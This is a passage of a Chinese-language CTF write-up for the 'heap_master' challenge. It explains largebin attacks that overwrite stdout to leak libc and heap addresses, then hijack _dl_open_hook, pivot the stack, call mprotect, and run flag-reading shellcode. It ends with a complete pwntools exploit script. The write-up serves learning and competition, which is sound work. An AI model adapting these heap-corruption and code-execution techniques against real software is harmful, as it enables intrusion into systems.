##largebin->bk_nextsize:stdout-0x20
edit(0x1000+0x20,p64(0)+p16(stdout-0x20))
add(0xf1)
```
下面还要修改write_base，修改方法和上一个exp相同，进行新一轮的argebin attack。覆写write_base的低字节为‘\x00’，同样我们需要一个‘\x7f’的地址，首先将largebin中第一个chunk附近构造一个0x210的chunk，将其释放进入到unsorted bin中，这样largebin里就有一个main_arena附近的地址。修改其bk_nextsize为stdout-0x19-0x20，再释放一个0x400的chunk，进行size的链表更新时stdout-0x19被写入偏移为0x3000的chunk的起始地址。从而泄露libc和mmap的heap_base。

```python
edit(0x1010+0x8,p64(0x211))
edit(0x1010+0x8+0x210,p64(0x21))
edit(0x1010+0x8+0x230,p64(0x21))
delete(0x1020) #0x210
add(0x100)

edit(0x3000+0x8,p64(0x401))
edit(0x3000+0x8+0x400,p64(0x21))
edit(0x3000+0x8+0x420,p64(0x21))
delete(0x3010) #0x400
edit(0x1000+0x20,p64(0)+p16(stdout+0x19-0x20))
add(0x200)
```

### largebin attack修改_dl_open_hook
这次largebin attack，bk_nextsize被修改为libc.sym[“_dl_open_hook”]-0x20，因此_dl_open_hook处被修改为偏移为0x3210的堆的起始地址。

```python
edit(0x1000+0x8,p64(0x421))
edit(0x1000+0x8+0x20,p64(libc.sym["_dl_open_hook"]-0x20))

##unsorted bin:0x1f0->0x400
##before:largebin:0x420->0x410
#_dl_open_hook:victim
edit(0x3210+0x8,p64(0x401))
edit(0x3210+0x8+0x400,p64(0x20))
edit(0x3210+0x8+0x420,p64(0x21))
add(0x500)
```

如果_dl_open_hook不为空时，程序跳转到_dl_open_hook处的地址执行，官方exp在偏移为0x3210的chunk处布了一个one_gadget：

```python
# 0x7FD7D: mov     rdi, [rbx+48h]
#          mov     rsi, r13
#          call    qword ptr [rbx+40h]
```

程序在跳转到_dl_open_hook执行时，rbx的值是偏移为0x3210的堆的起始地址。如下图所示。那我们可以在rbx+0x40处布置好我们的rop。

img9

```python
edit(0x3210,p64(libc.address+0x7fd7d))
edit(0x3210+0x40,p64(libc.address+0x43565)) #call
edit(0x3210+0x48,p64(heap_base+0x5000)) #rdi
```

exp里布置的rop如下，因为我们前面可以控制rdi的值，将rdi赋值为heap_base+0x5000，之后在heap_base+0x5000上edit就几乎可以修改所有的寄存器。

```
0x43565: mov     rsp, [rdi+0A0h]

#    .text:0000000000043565                 mov     rsp, [rdi+0A0h]
#    .text:000000000004356C                 mov     rbx, [rdi+80h]
#    .text:0000000000043573                 mov     rbp, [rdi+78h]
#    .text:0000000000043577                 mov     r12, [rdi+48h]
#    .text:000000000004357B                 mov     r13, [rdi+50h]
#    .text:000000000004357F                 mov     r14, [rdi+58h]
#    .text:0000000000043583                 mov     r15, [rdi+60h]
#    .text:0000000000043587                 mov     rcx, [rdi+0A8h]
#    .text:000000000004358E                 push    rcx
#    .text:000000000004358F                 mov     rsi, [rdi+70h]
#    .text:0000000000043593                 mov     rdx, [rdi+88h]
#    .text:000000000004359A                 mov     rcx, [rdi+98h]
#    .text:00000000000435A1                 mov     r8, [rdi+28h]
#    .text:00000000000435A5                 mov     r9, [rdi+30h]
#    .text:00000000000435A9                 mov     rdi, [rdi+68h]
#    .text:00000000000435AD                 xor     eax, eax
#    .text:00000000000435AF                 retn
```

后面将rsp赋值为[heap_base+0x5100]，然后在[heap_base+0x5100]上布置读取flag的shellcode。在这之前，因为上一个exp读取flag使用的是libc里的rop，但这次将shellcode布置到了mmap的内存上，需要将这块内存赋予可执行权限，因此首先调用mprotect(heap_base,0x10000,0x7)将[heap_base,heap_base+0x10000]修改为rwx，然后返回到shellcode读取flag。

```python
code = """
        xor rsi,rsi
        mov rax,SYS_open
        call here
        .string "./flag"
        here:
        pop rdi
        syscall
        mov rdi,rax
        mov rsi,rsp
        mov rdx,0x100
        mov rax,SYS_read
        syscall
        mov rdi,1
        mov rsi,rsp
        mov rdx,0x100
        mov rax,SYS_write
        syscall
        mov rax,SYS_exit
        syscall
    """
shellcode = asm(code,arch="amd64")

##mprotect(heap_base,0x10000,0x7) -> rwx
##retn:[heap_base+0x5100] = heap_base + 0x5108
##shellcode
rop_f = {
        0xa0:heap_base + 0x5100, #rsp = [rdi+0xa0]
        0xa8:libc.sym["mprotect"], #rcx = [rdi+0a8]
        0x70:0x10000, #rsi = [rdi+0x70]
        0x88:0x7, #rdx = [rdi+0x88]
        0x68:heap_base, #rdi = [rdi+0x68]
        0x100:heap_base + 0x5108,
        0x108:shellcode
    }
rop = fit(rop_f,filler='\x00')
edit(0x5000,rop)
```

最后malloc或free报错触发_dl_open_hook，读取到flag。

img10

完整exp如下：

```python
from pwn import *

context.update(os="linux",arch="amd64")
context.log_level = "debug"
#context.terminal = ["tmux","split","-h"]

p = process("./heap_master")

def change_ld(binary, ld):
    """
    Force to use assigned new ld.so by changing the binary
    """
    if not os.access(ld, os.R_OK): 
        log.failure("Invalid path {} to ld".format(ld))
        return None
 
         
    if not isinstance(binary, ELF):
        if not os.access(binary, os.R_OK): 
            log.failure("Invalid path {} to binary".format(binary))
            return None
        binary = ELF(binary)
 
 
    for segment in binary.segments:
        if segment.header['p_type'] == 'PT_INTERP':
            size = segment.header['p_memsz']
            addr = segment.header['p_paddr']
            data = segment.data()
            if size <= len(ld):
                log.failure("Failed to change PT_INTERP from {} to {}".format(data, ld))
                return None
            binary.write(addr, ld.ljust(size, '\0'))
            if not os.access('/tmp/pwn', os.F_OK): os.mkdir('/tmp/pwn')
            path = '/tmp/pwn/{}_debug'.format(os.path.basename(binary.path))
            if os.access(path, os.F_OK): 
                os.remove(path)
                info("Removing exist file {}".format(path))
            binary.save(path)    
            os.chmod(path, 0b111000000) #rwx------
    success("PT_INTERP has changed from {} to {}. Using temp file {}".format(data, ld, path)) 
    return ELF(path)


def add(size):
    p.recvuntil(">> ")
    p.sendline('1')
    p.recvuntil("size: ")
    p.sendline(str(size))

def edit(idx,data):
    p.recvuntil(">> ")
    p.sendline('2')
    p.recvuntil("offset: ")
    p.sendline(str(idx))
    p.recvuntil("size: ")
    p.sendline(str(len(data)))
    p.recvuntil("content: ")
    p.send(data)

def delete(idx):
    p.recvuntil(">> ")
    p.sendline('3')
    p.recvuntil("offset: ")
    p.sendline(str(idx))

def g(offset):
   return libc.address + offset


DEBUG = 0
if DEBUG:
   p = process("./heap_master")
   libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
   stdout = 0x2620
else:
   elf = change_ld('./heap_master', './ld-linux-x86-64.so.2')
   p = elf.process(env={'LD_PRELOAD':'./libc.so.6'})
   libc = ELF("./libc.so.6")
   stdout = 0x5600

edit(0x1000+0x8,p64(0x421)) #p1
edit(0x1000+0x8+0x420,p64(0x21))
edit(0x1000+0x8+0x440,p64(0x21))
delete(0x1010) #0x420

edit(0x500+0x8,p64(0x101)) #p2
edit(0x500+0x8+0x100,p64(0x21))
edit(0x500+0x8+0x120,p64(0x21))
delete(0x510) #0x100


##largebin:p1 0x420
add(0xf1) #0x100 unsorted bin empty

gdb.attach(p)
##largedbin 0x420:fd_nextsize = bk_nextsize = main_arena+0x58
edit(0x1000+0x10,p64(0)+p64(0x101))
edit(0x1000+0x10+0x100,p64(0)+p64(0x21))
edit(0x1000+0x10+0x120,p64(0)+p64(0x21))
delete(0x1020) #0x100
add(0xf0)

edit(0x2a10+0x8,p64(0x411))
edit(0x2a10+0x8+0x410,p64(0x21))
edit(0x2a10+0x8+0x430,p64(0x21))
delete(0x2a20) #0x410


edit(0x1500+0x8,p64(0x101))
edit(0x1500+0x8+0x100,p64(0x21))
edit(0x1500+0x8+0x120,p64(0x21))
delete(0x1510) #0x100


## if f->flag & 0xa00 and f->flag & 0x1000 == 1 then it will leak something when f->write_base != f->write_ptr
##largebin->bk_nextsize:stdout-0x20
edit(0x1000+0x20,p64(0)+p16(stdout-0x20))
add(0xf1)

##largedbin 0x420:fd_nextsize = bk_nextsize = main_arena+0x58
edit(0x1010+0x8,p64(0x211))
edit(0x1010+0x8+0x210,p64(0x21))
edit(0x1010+0x8+0x230,p64(0x21))
delete(0x1020) #0x210
add(0x100)

edit(0x3000+0x8,p64(0x401))
edit(0x3000+0x8+0x400,p64(0x21))
edit(0x3000+0x8+0x420,p64(0x21))
delete(0x3010) #0x400
edit(0x1000+0x20,p64(0)+p16(stdout+0x19-0x20))
add(0x200)

if DEBUG:
   p.recvn(0x18)
   leak_addr = u64(p.recvn(0x8))
   libc.address = leak_addr - (0x7ffff7dd06e0 - 0x7ffff7a0d000)
   heap_base = u64(p.recvn(8)) - (0x4fb33a10 - 0x4fb31000)

else:
   heap_base = u64(p.recvn(8)) - (0xaeceda10 - 0xaeceb000)
   libc.address = u64(p.recvn(8)) - (0x7ffff7dd5683 - 0x7ffff7a37000)

print "libc_base:",hex(libc.address)
print "heap_base:",hex(heap_base)


edit(0x1000+0x8,p64(0x421))
edit(0x1000+0x8+0x20,p64(libc.sym["_dl_open_hook"]-0x20))

##unsorted bin:0x1f0->0x400
##before:largebin:0x420->0x410
#_dl_open_hook:victim
edit(0x3210+0x8,p64(0x401))
edit(0x3210+0x8+0x400,p64(0x20))
edit(0x3210+0x8+0x420,p64(0x21))
add(0x500)

#gdb.attach(p)

# 0x7FD7D: mov     rdi, [rbx+48h]
#          mov     rsi, r13
#          call    qword ptr [rbx+40h]
# 0x43565: mov     rsp, [rdi+0A0h]

#    .text:0000000000043565                 mov     rsp, [rdi+0A0h]
#    .text:000000000004356C                 mov     rbx, [rdi+80h]
#    .text:0000000000043573                 mov     rbp, [rdi+78h]
#    .text:0000000000043577                 mov     r12, [rdi+48h]
#    .text:000000000004357B                 mov     r13, [rdi+50h]
#    .text:000000000004357F                 mov     r14, [rdi+58h]
#    .text:0000000000043583                 mov     r15, [rdi+60h]
#    .text:0000000000043587                 mov     rcx, [rdi+0A8h]
#    .text:000000000004358E                 push    rcx
#    .text:000000000004358F                 mov     rsi, [rdi+70h]
#    .text:0000000000043593                 mov     rdx, [rdi+88h]
#    .text:000000000004359A                 mov     rcx, [rdi+98h]
#    .text:00000000000435A1                 mov     r8, [rdi+28h]
#    .text:00000000000435A5                 mov     r9, [rdi+30h]
#    .text:00000000000435A9                 mov     rdi, [rdi+68h]
#    .text:00000000000435AD                 xor     eax, eax
#    .text:00000000000435AF                 retn

edit(0x3210,p64(libc.address+0x7fd7d))
edit(0x3210+0x40,p64(libc.address+0x43565)) #call
edit(0x3210+0x48,p64(heap_base+0x5000)) #rdi

code = """
        xor rsi,rsi
        mov rax,SYS_open
        call here
        .string "./flag"
        here:
        pop rdi
        syscall
        mov rdi,rax
        mov rsi,rsp
        mov rdx,0x100
        mov rax,SYS_read
        syscall
        mov rdi,1
        mov rsi,rsp
        mov rdx,0x100
        mov rax,SYS_write
        syscall
        mov rax,SYS_exit
        syscall
    """
shellcode = asm(code,arch="amd64")

##mprotect(heap_base,0x10000,0x7) -> rwx
##retn:[heap_base+0x5100] = heap_base + 0x5108
##shellcode
rop_f = {
        0xa0:heap_base + 0x5100, #rsp = [rdi+0xa0]
        0xa8:libc.sym["mprotect"], #rcx = [rdi+0a8]
        0x70:0x10000, #rsi = [rdi+0x70]
        0x88:0x7, #rdx = [rdi+0x88]
        0x68:heap_base, #rdi = [rdi+0x68]
        0x100:heap_base + 0x5108,
        0x108:shellcode
    }
rop = fit(rop_f,filler='\x00')
edit(0x5000,rop)

##trigger
delete(0x10)

p.interactive()
```